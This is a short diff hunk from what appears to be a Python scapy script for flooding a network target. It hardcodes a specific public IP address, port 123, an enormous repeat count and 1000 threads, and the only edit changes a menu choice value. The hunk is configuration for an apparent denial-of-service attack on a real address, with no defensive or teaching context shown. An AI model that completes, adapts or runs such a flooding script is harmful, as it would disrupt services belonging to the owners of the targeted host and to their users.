@@ -9,7 +9,7 @@ from scapy.all import *
 
 ip = '82.200.161.178'
 port = 123
-choice = 'y'
+choice = '1'
 times = 1000000000000000000
 threads = 1000
 def run():
